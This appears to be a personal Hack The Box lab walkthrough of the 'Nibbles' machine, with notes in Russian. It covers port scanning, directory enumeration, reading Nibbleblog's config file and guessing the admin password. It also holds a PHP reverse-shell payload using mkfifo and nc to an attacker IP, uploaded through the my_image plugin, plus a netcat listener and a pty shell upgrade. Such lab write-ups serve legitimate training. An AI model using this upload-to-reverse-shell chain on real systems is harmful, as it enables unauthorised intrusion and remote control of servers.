PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


curl 10.129.15.175
<b>Hello world!</b>
<!-- /nibbleblog/ directory. Nothing interesting here! -->




curl http://10.129.15.175/nibbleblog/

<!DOCTYPE HTML>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Nibbles - Yum yum</title>
<meta name="generator" content="Nibbleblog">
<link rel="canonical" href="http://10.10.10.134/nibbleblog/">
<link rel="alternate" type="application/atom+xml" title="ATOM Feed" href="/nibbleblog/feed.php">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/normalize.css">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/main.css">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/post.css">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/page.css">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/plugins.css">
<link rel="stylesheet" type="text/css" href="/nibbleblog/themes/simpler/css/rainbow.css">
<script src="/nibbleblog/admin/js/jquery/jquery.js"></script>
<script src="/nibbleblog/themes/simpler/js/rainbow-custom.min.js"></script>
<link rel="shortcut icon" href="/nibbleblog/themes/simpler/css/img/favicon.ico" type="image/x-icon">
</head>
<body>

<div id="container">

	<!-- HEADER -->
	<header id="blog-head">
		<a href="/nibbleblog/">
			<span class="blog-name">Nibbles</span>
			<span class="blog-slogan">Yum yum</span>
		</a>
	</header>

	<!-- MAIN -->
	<section id="main">

		<!-- PLUGINS -->
		<section id="sidebar"><div class="plugin-box plugin_categories"><h3 class="plugin-title">Categories</h3><ul><li class="category"><a href="/nibbleblog/index.php?controller=blog&amp;action=view&amp;category=uncategorised">Uncategorised</a></li><li class="category"><a href="/nibbleblog/index.php?controller=blog&amp;action=view&amp;category=music">Music</a></li><li class="category"><a href="/nibbleblog/index.php?controller=blog&amp;action=view&amp;category=videos">Videos</a></li></ul></div><div class="plugin-box plugin_hello_world"><h3 class="plugin-title">Hello world</h3><p>Hello world</p></div><div class="plugin-box plugin_latest_posts"><h3 class="plugin-title">Latest posts</h3><ul></ul></div><div class="plugin-box plugin_my_image"><h3 class="plugin-title">My image</h3><ul><li><img alt="" src="/nibbleblog/content/private/plugins/my_image/image.jpg" /></li></ul></div><div class="plugin-box plugin_pages"><h3 class="plugin-title">Pages</h3><ul><li><a href="/nibbleblog/">Home</a></li></ul></div></section>
		<!-- VIEW -->
		<section id=left >
			<p>There are no posts</p><section id="pager">
	
	<a class="home-page" href="/nibbleblog/">Home</a>
	</section>		</section>

	</section>

	<!-- FOOTER -->
	<footer id="blog-foot">
		<span class="blog-atom"><a href="/nibbleblog/feed.php">Atom</a></span>
		<span class="blog-footer"> · <a class="top" href="#">Top</a></span>
		<span class="blog-footer"> · Powered by Nibbleblog</span>
		<script>
		$(".top").click(function(){
			$("html, body").animate({ scrollTop: 0 }, 600);
			return false;
		});
		</script>
	</footer>

</div>

</body>
</html>







gobuster dir -u http://10.129.15.175/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt

Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 308]
/.hta                 (Status: 403) [Size: 303]
/.htaccess            (Status: 403) [Size: 308]
/README               (Status: 200) [Size: 4628]
/admin                (Status: 301) [Size: 325] [--> http://10.129.15.175/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 327] [--> http://10.129.15.175/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 329] [--> http://10.129.15.175/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 327] [--> http://10.129.15.175/nibbleblog/plugins/]
/themes               (Status: 301) [Size: 326] [--> http://10.129.15.175/nibbleblog/themes/]
Progress: 4723 / 4724 (99.98%)





http://10.129.15.175/nibbleblog/content/private/users.xml

Файл находится именно в каталоге content 
Каталог content/ обычно присутствует во всех версиях CMS
В нашем случае он есть в выводе доступных каталогов (выше)



SavitskiyES@htb[/htb]$ curl -s http://10.129.15.175/nibbleblog/content/private/config.xml | xmllint --format -

<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<config>
  <name type="string">Nibbles</name>
  <slogan type="string">Yum yum</slogan>
  <footer type="string">Powered by Nibbleblog</footer>
  <advanced_post_options type="integer">0</advanced_post_options>
  <url type="string">http://10.129.42.190/nibbleblog/</url>
  <path type="string">/nibbleblog/</path>
  <items_rss type="integer">4</items_rss>
  <items_page type="integer">6</items_page>
  <language type="string">en_US</language>
  <timezone type="string">UTC</timezone>
  <timestamp_format type="string">%d %B, %Y</timestamp_format>
  <locale type="string">en_US</locale>
  <img_resize type="integer">1</img_resize>
  <img_resize_width type="integer">1000</img_resize_width>
  <img_resize_height type="integer">600</img_resize_height>
  <img_resize_quality type="integer">100</img_resize_quality>
  <img_resize_option type="string">auto</img_resize_option>
  <img_thumbnail type="integer">1</img_thumbnail>
  <img_thumbnail_width type="integer">190</img_thumbnail_width>
  <img_thumbnail_height type="integer">190</img_thumbnail_height>
  <img_thumbnail_quality type="integer">100</img_thumbnail_quality>
  <img_thumbnail_option type="string">landscape</img_thumbnail_option>
  <theme type="string">simpler</theme>
  <notification_comments type="integer">1</notification_comments>
  <notification_session_fail type="integer">0</notification_session_fail>
  <notification_session_start type="integer">0</notification_session_start>
  <notification_email_to type="string">admin@nibbles.com</notification_email_to>
  <notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
  <seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
  <seo_site_description type="string"/>
  <seo_keywords type="string"/>
  <seo_robots type="string"/>
  <seo_google_code type="string"/>
  <seo_bing_code type="string"/>
  <seo_author type="string"/>
  <friendly_urls type="integer">0</friendly_urls>
  <default_homepage type="integer">0</default_homepage>
</config>



пароль оказался nibbles (nibbles в заголовке сайта, а также в адресе электронной почты)

В плагинах нашли возможность загружать файлы на сервер это дает нам возможность использовать загрузку файлов для получения удаленного подключения к системе (plugin my_image)
http://10.129.15.175/nibbleblog/content/private/plugins/my_image/

Нам удалось загруить файл:
[★]$ curl http://10.129.15.175/nibbleblog/content/private/plugins/my_image/image.php
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

Загружаем скрипт php отредактированный для получения доступа к оболочке:
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 9443 >/tmp/f"); ?>    (указываем наш ip и порт)

Запускаем у себя на этом порте netcat для прослушки входящих соединений:
nc -lvnp 9443

Запускаем загруженный на сервер файл:
http://10.129.15.175/nibbleblog/content/private/plugins/my_image/image.php


Получаем доступ к оболочке:listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.15.175] 51618
/bin/sh: 0: can't access tty; job control turned off
$ С


Команда для py2 если более старая версия:
python -c 'import pty; pty.spawn("/bin/bash")'


Обновляем оболочку до полноценной для использования su и sudo (используем команду для py3):
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ls
ls
db.xml	image.php
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 


зайти в домашний каталог пользователя используя cd для перемещения
Получить флаг





